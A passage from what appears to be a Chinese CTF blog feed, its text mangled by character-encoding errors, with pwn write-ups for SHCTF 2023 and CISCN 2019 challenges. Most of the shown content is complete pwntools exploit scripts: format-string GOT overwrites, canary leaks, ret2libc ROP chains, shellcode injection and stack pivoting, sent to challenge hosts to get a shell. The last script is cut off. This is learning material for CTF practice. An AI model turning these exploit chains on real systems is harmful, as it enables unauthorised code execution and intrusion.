<p>idaåæ±‡ç¼–ä¸€ä¸‹ï¼Œä»£ç å®¡è®¡ä½ ä¼šå‘ç°å‡ºç°äº†æ ¼å¼å­—ç¬¦ä¸²æ¼æ´ï¼Œå¹¶ä¸”åœ¨æç¤º &quot;Input your message:&quot; çš„æ—¶å€™ï¼Œä½ è¾“å…¥çš„æ•°æ®ä¼šè¢« printf æ‰“å°å‡ºæ¥ï¼Œè¿™ä¸ªæ—¶å€™æ˜¯ä¸æ˜¯å¯ä»¥æŠŠ&#x2F;bin&#x2F;shå†™è¿›å»ï¼Œç„¶åæŠŠ printf ä¿®æ”¹æˆ system ï¼Œè¿™æ ·æ˜¯ä¸æ˜¯å°±å¯ä»¥è·å¾—shelläº†ï¼Œå‰æå°±å¾—å…ˆæ³„éœ²libcï¼Œå¾—åˆ°system</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/8.png"></p>
<p>é¦–å…ˆï¼Œå…ˆå¾—åˆ°ç¨‹åºçš„åç§»ä¸º6ï¼Œç„¶åå°±æ˜¯å»gdbè°ƒè¯•ï¼Œæ‰¾åˆ°åˆé€‚çš„åœ°å€å»æ³„éœ²libc</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/9.png"></p>
<p>æˆ‘ç®—åˆ°çš„åç§»æ˜¯0x29d90ï¼Œä¸æ˜¯0x24083ï¼Œå•Šå•Šå•Šå•Šæ€ä¹ˆç®—åˆ°çš„å•Šï¼ˆæœ‰æ²¡æœ‰å¸ˆå‚…æµ‡æµ‡å•ŠT^Tï¼‰</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/11.png"></p>
<p>æœ‰äº›ä¸œè¥¿ä¸å¥½ç†è§£ï¼Œä¹Ÿä¸çŸ¥é“æ€ä¹ˆæ¥çš„ï¼Œå…¶ä»–å¤§ä½¬çš„wpï¼Œéƒ½æ˜¯é»˜è®¤å¤§å®¶éƒ½çŸ¥é“ï¼Œéƒ½ä¸è§£é‡Šçš„ï¼Œå­¦çš„å¥½ç´¯å•Šå•Šå•Šå•Š T^T </p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">31318</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"> </span><br><span class="line">payload =<span class="string">b&#x27;%43$p&#x27;</span></span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Input your choice:\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Input your message:\n&quot;</span>,payload)</span><br><span class="line"> </span><br><span class="line">libc_base =<span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">243</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]   <span class="comment">#0x24083</span></span><br><span class="line">system = libc_base +libc.sym[<span class="string">&#x27;system&#x27;</span>] </span><br><span class="line"> </span><br><span class="line">payload =fmtstr_payload(<span class="number">6</span>, &#123;printf_got: system&#125;)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Input your choice:\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Input your message:\n&quot;</span>,payload)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Input your choice:\n&quot;</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Input your choice:\n&quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="åŸå§‹äººèµ·åŠ¨">åŸå§‹äººï¼Œèµ·åŠ¨</span></h2><ul>
<li><strong>ä¿æŠ¤æœºåˆ¶</strong>ï¼šä»…å¼€å¯ NX</li>
<li><strong>å¤‡æ³¨</strong>ï¼šé€»è¾‘ç•¥ç»•ï¼Œéœ€è¿›ä¸€æ­¥åˆ†æ</li>
</ul>
<p>æŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤æœºåˆ¶ï¼Œåªæ‰“å¼€äº†NX</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/12.png"></p>
<p>idaåæ±‡ç¼–ï¼Œä»£ç å®¡è®¡ä¸€ä¸‹ï¼Œæœ‰ç‚¹éš¾ç†æ¸…é‡Œé¢çš„é€»è¾‘-_-ï¼Œæœ‰ç‚¹å°ç»•å•Šå•Šå•Šå•Šï¼Œå—ä¸äº†</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/13.png"></p>
<hr>
<h2><span id="è¦ä¹°äº›ä¸œè¥¿å—">è¦ä¹°äº›ä¸œè¥¿å—</span></h2><ul>
<li><strong>ä¿æŠ¤æœºåˆ¶</strong>ï¼š32 ä½ï¼Œå¼€å¯ canary å’Œ NX</li>
<li><strong>æ¼æ´ç±»å‹</strong>ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</li>
<li><strong>åˆ©ç”¨æ€è·¯</strong>ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ² canary ä¸ libcï¼Œé€šè¿‡åç§»æ„é€  rop é“¾ï¼Œè°ƒç”¨ system</li>
</ul>
<p>æŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤æœºåˆ¶ï¼Œ32ä½ç¨‹åºæ‰“å¼€äº†canaryå’ŒNX</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/14.png"></p>
<p>idaåæ±‡ç¼–ï¼Œä»£ç å®¡è®¡å‘ç°ç¨‹åºå‡ºç°äº†æ ¼å¼å­—ç¬¦ä¸²æ¼æ´ï¼Œå†åŠ ä¸Šæœ‰canaryï¼Œæ‰€ä»¥åº”è¯¥æ˜¯é€šè¿‡æ ¼å¼å­—ç¬¦ä¸²æ¥æ³„éœ²canaryï¼Œä¸‹é¢çœ‹çœ‹åç§»æ˜¯å¤šå°‘</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/15.png"></p>
<p>è¿è¡Œç¨‹åºï¼Œå‘ç°åç§»ä¸º7ï¼Œæ¥ä¸‹æ¥å°±æ˜¯gdbè°ƒè¯•ï¼Œå»çœ‹çœ‹canaryæ˜¯ç¬¬å‡ ä¸ªå‚æ•°ï¼ˆå¦‚ä¸‹å›¾ï¼Œå‘ç°canaryåœ¨ç¬¬15ä¸ªå‚æ•°ï¼‰ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ç¬¬19ä¸ªå‚æ•°æ¥æ³„éœ²libcï¼Œæ¥æ„é€ ropé“¾</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/16.png"></p>
<p>æ³„éœ²libcçš„è¿™ä¸ªåç§»è¿˜æ˜¯æ²¡æœ‰ç®—åˆ°ï¼Œå•Šå•Šå•Šå•Šï¼Œæœ‰çŸ¥é“çš„å¸ˆå‚…æµ‡æµ‡ï¼ˆçƒçƒäº†T^Tï¼‰</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/17.png"></p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(&#x27;./111&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">31224</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">ret =<span class="number">0x804900e</span></span><br><span class="line">bin_sh =<span class="number">0x804A03F</span></span><br><span class="line"> </span><br><span class="line">payload =<span class="string">b&#x27;%15$p.%19$p&#x27;</span></span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Your choice:\n&quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;and you can get a gift\n&#x27;</span>,payload)</span><br><span class="line"> </span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base =<span class="built_in">int</span>(p.recv(<span class="number">8</span>), <span class="number">16</span>) - <span class="number">245</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]   <span class="comment">#0x1aee5</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">system =libc_base +libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#bin_sh =libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"> </span><br><span class="line">payload =<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span> +p32(canary) +p32(<span class="number">0</span>) +p32(<span class="number">0</span>) +p32(<span class="number">0</span>) +p32(ret) +p32(system) +p32(<span class="number">0</span>) +p32(bin_sh)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Your choice:\n&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;and you can get the power\n&quot;</span>,payload)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h1><span id="æ€»ç»“">æ€»ç»“</span></h1><p>è¿™å‘¨é¢˜ç›®ç¡®å®ä¸Šæ¡£æ¬¡äº†ï¼Œæœ‰äº›ç‚¹ä¸å¤ªå¥½ç†è§£ï¼Œå…¶ä»–å¤§ä½¬çš„ WP å¾ˆå¤šéƒ½è·³æ­¥ä¸è§£é‡Šï¼Œéœ€è¦è‡ªå·±å¤šç»ƒé¢˜ã€å¤šè°ƒè¯•ã€å¤šæ€»ç»“ï¼ŒåŠ æ²¹åŠ æ²¹ï¼ï¼ï¼</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>SHCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>[CISCN 2019ååŒ—] PWN5ï¼ˆciscn_2019_n_5ï¼‰ å¤ç°</title>
    <url>/%5BCISCN%202019%E5%8D%8E%E5%8C%97%5D%20PWN5%EF%BC%88ciscn_2019_n_5%EF%BC%89%20%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>[CISCN 2019ååŒ—] PWN5ï¼ˆciscn_2019_n_5ï¼‰å¤ç°</p>
<span id="more"></span>

<h1><span id="ciscn_2019_n_5">ciscn_2019_n_5</span></h1><p>è€å¥—è·¯ï¼Œé¦–å…ˆ checksec ä¸€ä¸‹æ–‡ä»¶ï¼Œä¿æŠ¤æœºåˆ¶å…¨å…³ï¼ˆè¿™ä¸ªæ—¶å€™å°±è¦æƒ³åˆ°å¯ä»¥ç›´æ¥ shellcodeï¼‰ã€‚</p>
<p><img src="/images/%5BCISCN2019%E5%8D%8E%E5%8C%97%5DPWN5%EF%BC%88ciscn_2019_n_5%EF%BC%89%E5%A4%8D%E7%8E%B0/1.png"></p>
<p>ç„¶å IDA ä¸€ä¸‹çœ‹çœ‹ä¼ªä»£ç ï¼Œå¯ä»¥å‘ç°ä¸€ä¸ªåœ¨ <code>.bss</code> æ®µä¸Šé¢çš„ <code>name</code>ï¼Œå¹¶ä¸”åœ¨è¯¥ä»£ç æ®µä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œçš„æƒé™ï¼Œä¹Ÿå¾ˆå®¹æ˜“çœ‹å‡ºæ¥ <code>gets</code> é€ æˆäº†æº¢å‡ºï¼Œä¸‹é¢å°±å¼€å§‹å¯¹ç—‡ä¸‹è¯ï¼š</p>
<p><img src="/images/%5BCISCN2019%E5%8D%8E%E5%8C%97%5DPWN5%EF%BC%88ciscn_2019_n_5%EF%BC%89%E5%A4%8D%E7%8E%B0/2.png"></p>
<p><img src="/images/%5BCISCN2019%E5%8D%8E%E5%8C%97%5DPWN5%EF%BC%88ciscn_2019_n_5%EF%BC%89%E5%A4%8D%E7%8E%B0/3.png"></p>
<p><img src="/images/%5BCISCN2019%E5%8D%8E%E5%8C%97%5DPWN5%EF%BC%88ciscn_2019_n_5%EF%BC%89%E5%A4%8D%E7%8E%B0/4.png"></p>
<hr>
<h2><span id="æ³•ä¸€">æ³•ä¸€:</span></h2><p>ç›´æ¥åœ¨ <code>.bss</code> æ®µ <code>name</code> ä¸Šé¢ç›´æ¥æ„é€  shellcodeï¼ˆå› ä¸ºè¯¥æ–‡ä»¶æœªå¼€å¯ NX ä¿æŠ¤æœºåˆ¶ï¼Œå¹¶ä¸”è¯¥ä»£ç æ®µæƒé™å…¨å¼€ï¼‰ï¼Œç„¶åç›´æ¥æº¢å‡ºå°±å¯ä»¥å¾—åˆ° shellã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">io = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28499</span>)</span><br><span class="line"> </span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;tell me your name\n&#x27;</span>, shellcode)</span><br><span class="line"> </span><br><span class="line">name = <span class="number">0x601080</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(name)</span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">b&#x27;What do you want to say to me?\n&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="æ³•äºŒæ— -libc-ç‰ˆæœ¬æ–‡ä»¶">æ³•äºŒ:(æ—  libc ç‰ˆæœ¬æ–‡ä»¶)</span></h2><p>å¯ä»¥ç›´æ¥çœ‹æˆæ˜¯ ret2libcï¼Œç›´æ¥æ³„éœ² libcï¼Œæ„é€  rop é“¾æ¥è·å¾— shellã€‚å› ä¸ºè¿™é¢˜æœ‰ä¸€ä¸ªåœ¨ <code>.bss</code> æ®µä¸Šé¢çš„ <code>name</code>ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æŠŠ <code>/bin/sh</code> å†™åˆ° <code>name</code> é‡Œé¢ï¼Œæœ€åç›´æ¥æ‰§è¡Œå°±èƒ½è·å¾— shellã€‚</p>
<p><img src="/images/%5BCISCN2019%E5%8D%8E%E5%8C%97%5DPWN5%EF%BC%88ciscn_2019_n_5%EF%BC%89%E5%A4%8D%E7%8E%B0/5.png"></p>
<p>EXP å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28499</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x4006a9&#x27;)</span></span><br><span class="line">plt_addr = elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x400636</span></span><br><span class="line">ret_addr = <span class="number">0x4004c9</span></span><br><span class="line">rdi_addr = <span class="number">0x400713</span></span><br><span class="line">name_addr = <span class="number">0x601080</span></span><br><span class="line"> </span><br><span class="line">p.sendafter(<span class="string">b&#x27;name\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(rdi_addr) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;me?\n&#x27;</span>, payload)</span><br><span class="line"> </span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">p.sendafter(<span class="string">b&#x27;name\n&#x27;</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(ret_addr) + p64(rdi_addr) + p64(name_addr) + p64(system)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;me?\n&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="æ³•ä¸‰æœ‰-libc-ç‰ˆæœ¬æ–‡ä»¶">æ³•ä¸‰:(æœ‰ libc ç‰ˆæœ¬æ–‡ä»¶)</span></h2><p>æ­¤é¢˜ä¸º Ubuntu 18ï¼ˆ64 ä½ï¼‰ï¼Œå¯åœ¨ BUU ä¸Šé¢ç›´æ¥æ‰¾åˆ°ç›¸å¯¹åº”çš„ libc ç‰ˆæœ¬ã€‚æ„é€ çš„æ—¶å€™æœ‰äº›åœ°æ–¹ä¸æ—  libc ç‰ˆæœ¬çš„ä¸åŒï¼Œéœ€è¦æ³¨æ„ã€‚</p>
<p>EXP å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pythonå¤åˆ¶ç¼–è¾‘<span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28158</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x4006a9&#x27;)</span></span><br><span class="line">plt_addr = elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x400636</span></span><br><span class="line">ret_addr = <span class="number">0x4004c9</span></span><br><span class="line">rdi_addr = <span class="number">0x400713</span></span><br><span class="line">name_addr = <span class="number">0x601080</span></span><br><span class="line"> </span><br><span class="line">p.sendafter(<span class="string">b&#x27;name\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(rdi_addr) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;me?\n&#x27;</span>, payload)</span><br><span class="line"> </span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"> </span><br><span class="line">p.sendafter(<span class="string">b&#x27;name\n&#x27;</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(ret_addr) + p64(rdi_addr) + p64(name_addr) + p64(system)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;me?\n&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h1><span id="æ€»ç»“">æ€»ç»“</span></h1><p>æ­¤é¢˜æˆ‘è®¤ä¸ºéœ€è¦è®¤çœŸåˆ†æä¼ªä»£ç ï¼Œå‘ç°å…¶æ¼æ´å’Œä¸€äº›é‡è¦ä¿¡æ¯ï¼Œå¹¶ä¸”éœ€è¦äº†è§£æ€ä¹ˆæ„é€  shellcode å’Œæ„é€  rop æ‰§è¡Œæµï¼Œè¿™äº›éƒ½æ˜¯æ¯”è¾ƒåŸºç¡€çš„çŸ¥è¯†ç‚¹ã€‚</p>
<p>æœ€åæ³•äºŒå’Œæ³•ä¸‰æ„é€  EXP æœ‰äº›ä¸åŒç‚¹ï¼Œå¯ä»¥å°è¯•å¯¹æ¯”ä¸€ä¸‹ï¼Œä½ åº”è¯¥ä¼šæ”¶è·ä¸å°‘ï¼ˆä¸Šè¿°ä¸ºä¸ªäººçœ‹æ³•ï¼Œå¦‚æœ‰ä¸å¯¹ï¼Œå¸Œæœ›å„ä½å¸ˆå‚…æŒ‡æ­£ï¼‰ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>CISCN</tag>
      </tags>
  </entry>
  <entry>
    <title>SHCTF 2023 [WEEK 3] PWN</title>
    <url>/SHCTF%202023%20%5BWEEK%203%5D%20PWN/</url>
    <content><![CDATA[<p>SHCTF 2023 [WEEK 3] PWN</p>
<span id="more"></span>

<h1><span id="ç®€ä»‹">ç®€ä»‹</span></h1><p>æœ€åä¸€å‘¨çš„é¢˜ç›´æ¥ä¸Šå¼ºåº¦äº†ï¼Œæœ‰ç‚¹å—ä¸äº† T^Tï¼Œå…ˆè½¬è½½å®˜æ–¹çš„ WP å§ï¼Œåç»­ç¢ç£¨é€äº†å†æ¥æ”¹ã€‚</p>
<hr>
<h2><span id="call_call_would_backdoor">call_call_would_backdoor</span></h2><p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"> </span><br><span class="line">p=remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">31696</span> )</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./bac&#x27;)</span></span><br><span class="line"><span class="comment">#p=gdb.debug(&#x27;./bac&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./bac&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">ladd=elf.symbols[<span class="string">&#x27;backd00r&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%x&quot;</span>%ladd)</span><br><span class="line">p1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x48</span>+<span class="number">4</span>)+p32(ladd)</span><br><span class="line">p.sendafter(<span class="string">&quot;?&quot;</span>,p1)</span><br><span class="line"> </span><br><span class="line">p2=<span class="string">&quot;MTEwL2Jpbi9zaA==&quot;</span></span><br><span class="line">p.sendafter(<span class="string">&quot;!&quot;</span>,p2)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p.sendlineafter(&quot;:&quot;,p1)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#send</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="transfer">transfer</span></h2><p>ç¨‹åºæœªå¯ç”¨ PIEï¼Œå¯é€šè¿‡é™æ€è°ƒè¯•è·å–å…¨å±€å˜é‡åœ°å€ã€‚</p>
<ol>
<li>ç¬¬ä¸€æ¬¡è¾“å…¥ 0xc8 å­—èŠ‚å†™å…¥ data æ®µï¼›</li>
<li>ç¬¬äºŒæ¬¡è¾“å…¥æº¢å‡º 0x10 å­—èŠ‚å®ç°æ ˆè¿ç§»ï¼›</li>
<li>ç¨‹åºå·²æä¾› <code>system</code> å‡½æ•°ã€‚</li>
</ol>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./transfer&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;112.6.51.212&#x27;</span>, <span class="number">32178</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./transfer&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"> </span><br><span class="line">target_addr = <span class="number">0x405160</span>-<span class="number">0x8</span></span><br><span class="line">bin_sh_addr = <span class="number">0x405160</span>+<span class="number">0x18</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401313</span></span><br><span class="line">leave_ret = <span class="number">0x00000000004012a7</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = p64(pop_rdi_ret)</span><br><span class="line">payload += p64(bin_sh_addr)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;haha,welcome!&quot;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(target_addr)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">io.recvuntil(<span class="string">&quot;input:&quot;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"> </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="aftermath">Aftermath</span></h2><p>ä¸‰æ¡çŸ¥è¯†ç‚¹è·¯çº¿ï¼ˆTrail1â€“3ï¼‰ï¼š</p>
<ol>
<li>ç”¨ <code>ctypes</code> æ¨¡æ‹Ÿ C å‡½æ•°ä¸éšæœºæ•°è¾“å…¥ç»•è¿‡ï¼›</li>
<li>æ£€æŸ¥ç¬¦å· <code>&#39;-&#39;</code> åˆ¤æ–­è´Ÿæ•°ï¼Œç”¨æ•´æ•°æº¢å‡ºæ–¹å¼è¾“å…¥ä¸¤ä¸ªè¶… <code>INT_MAX</code> å€¼ç»•è¿‡ï¼›</li>
<li>ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¿®æ”¹ <code>printf_got</code> ä¸º <code>system</code>ã€‚</li>
</ol>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">native = <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> native:</span><br><span class="line">   p = process(<span class="string">&#x27;pwn1&#x27;</span>)</span><br><span class="line">   libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   p = remote(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title 